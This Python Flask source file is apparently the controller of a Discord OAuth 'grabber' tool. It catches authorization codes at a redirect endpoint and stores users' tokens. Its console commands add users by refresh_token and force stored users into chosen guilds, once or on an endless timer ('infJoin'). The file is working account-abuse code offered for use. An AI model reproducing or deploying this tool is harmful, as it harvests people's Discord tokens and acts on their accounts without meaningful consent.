import requests
import os.path
import socket
import logging
from cli import CLI
import time
from configparser import ConfigParser
from flask import Flask, render_template, request
from threading import Thread, Event
import oauth as worker
app = Flask(__name__)
flasLogger = logging.getLogger('werkzeug')
flasLogger.setLevel(logging.ERROR)
config = ConfigParser()
configPath = 'resources/config.ini'
console = CLI('~: ','Bye see you next time :)')
#dbPath = 'resources/db.json'

Threads = []
interval = None

try:    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    LOCAL_IP = s.getsockname()[0]
    EXTERNAL_IP = requests.get('https://api.ipify.org').content.decode('utf8')
    s.close()
except Exception as err:
    print('Error while getting ips! Exiting! Error: ', err)
    print('Error while getting ips! Check your internet connection! Exiting!')
    exit()

if(os.path.exists(configPath)):
    print('config file exist')
    config.read(configPath)
else:
    print('config file doesn\'t exist! creating, you have to enter some values!')
    a = input("Discord client id: ")
    b = input("Discord client secret: ")
    g = input("Discord bot token: ")
    while(True):
        c = input("Discord api url(https://discord.com/api/v10): ")
        if(c == ''):
            c = 'https://discord.com/api/v10'
            break
        if(c.startswith("https://discord.com/api/")):
            break
        else:
            print('incorrect url')
    while(True):
        d = input("Port(3000) 1024-32766: ")
        if(d == ''):
            d = 3000
        try:
            ret = int(d)
            if(ret>=1024 and ret<=32767):
                break
            else:
                print("incorrect port number! pls enter number in 1024-32766")
        except ValueError:
            print('You have not entered a number!')
    while(True):
        e = input('redirect url *generated exactly for you*(%s): ' % 'http://%s:' % EXTERNAL_IP)
        if(e == ''):
            e = 'http://%s:' % EXTERNAL_IP
            break
        if(e.startswith('http')):
            break
        else:
            print('incorrect url! please enter http(https) url!')
    while(True):
        f = input("Url path(/api/auth/discord/redirect): ")
        if(f == ''):
            f = "/api/auth/discord/redirect"
            break
        if(f == '/'):
            print('incorrect path! must be more then just "/"')
        elif(f.startswith('/')):
            break
        else:
            print('incorrect path! must start with /')
    
    config['discord'] = {'client_id': a,
                         'client_secret': b,
                         'api': c,
                         'bot_token': g}
    config['grabber'] = {'port': d,
                         'redirect_uri': e,
                         'grabber_url_args': f}
    print('Your redirect url:"%s"' % (str(e)+str(d)+str(f)))
    print('writing config file in %s' % configPath)
    with open(configPath, 'w') as conf:
        config.write(conf)
        print('writed config file in %s' % configPath)

API_ENDPOINT = config['discord']['api']
CLIENT_ID = config['discord']['client_id']
CLIENT_SECRET = config['discord']['client_secret']
BOT_TOKEN = config['discord']['bot_token']
PORT = config['grabber']['port']
URL_ARGS = config['grabber']['grabber_url_args']
REDIRECT_URI = config['grabber']['redirect_uri'] + PORT + URL_ARGS

worker.API_ENDPOINT = API_ENDPOINT
worker.CLIENT_ID = CLIENT_ID
worker.CLIENT_SECRET = CLIENT_SECRET
worker.REDIRECT_URI = REDIRECT_URI
worker.BOT_TOKEN = BOT_TOKEN

@app.route("/")
def home():
    return render_template('home.html')

@app.route(URL_ARGS)
async def login():
    if (request.args.__contains__('code')):
        code = request.args['code']
        i = Threads.__len__()
        if(worker.output):print(request.remote_addr,request.user_agent)
        Threads.append(Thread(target=worker.Code_catch, args=(code, i,), daemon=True))
        Threads[i].start()
        return 'hi!'

def web():
    app.run(debug = False, port=PORT,host=LOCAL_IP)

def JoinInterval(guild_ids, user_ids, timeToSleep, event):
    print('started infinity join!')
    timeToSleep = float(int(timeToSleep))
    if(timeToSleep < 10):
        timeToSleep = 10
    while(True):
        a = 0
        worker.Joiner(guild_ids,user_ids)
        while a < timeToSleep:
            
            time.sleep(1.0)
            a += 1
            if event.is_set():
                print('stoped infinity join!')
                return
    
#CLI FUNCS
def debug():
    worker.debug = not worker.debug
    if(worker.debug):
        print('Debug now is turned on')
    else:
        print('Debug now is turned off')
def output():
    worker.output = not worker.output
    if(worker.output):
        print('Output now is turned on')
    else:
        print('Output now is turned off')
def getByName(name):
    worker.dbWorker.show(worker.dbWorker.getByName(name))
def getById(id):
    worker.dbWorker.show(worker.dbWorker.getById(id))
def joinGuild(guild_ids, user_ids):
    worker.Joiner(guild_ids, user_ids)
def InfJoin(guild_ids, user_ids, time):
    interval = Event()
    i = Threads.__len__()
    Threads.append(Thread(target=JoinInterval,args=(guild_ids, user_ids, time, interval),daemon=True))
    Threads[i].start()

Threads.append(Thread(target=web, args={}, daemon=True))
Threads[0].start()


interval = Event()
#CLI init
console.addCommand('debug','turn on/off debug. Usage: "debug"', 0, debug)
console.addCommand('output','turn on/off output, less information, recommend to be turned on. Usage: "output"', 0, output)
console.addCommand('users','show all users in DB. Usage: "users"', 0, worker.GetUsers)
console.addCommand('byName','show user info from DB. Usage: "byName <username>"', 1, getByName)  
console.addCommand('byId','show user info from DB, recommended. Usage: "byId <user_id>"', 1, getById) 
console.addCommand('update','update the info about user/users. Usage: "update <user_id>" or "update <user_id1>,<user_id2>..." or "update -1" - all', 1, worker.Update)
console.addCommand('joinGuild','Makes user/users join specified guild/guilds(only with bot on it!). Usage: "joinGuild <guild_id> <user_id>" or "joinGuild <guild_id1>,<guild_id2> <user_id1>,<user_id2>" or "joinGuild <guild_id> -1" - join guild/guilds with all users from DB', 2, worker.Joiner)
console.addCommand('infJoin','runs joinGuild with specified interval. Usage: "infJoin <guild_id> <user_id> <time_interval> - same as joinGuild"', 3, InfJoin)
console.addCommand('stopInf','stops all infJoin instances! Usage: "stopInf"', 0, interval.set)
console.addCommand('add','add user to db by refresh_token, works only with same bot! Usage: "add <refresh_token>"', 1, worker.Add)


time.sleep(1.0)
console.mainLoop()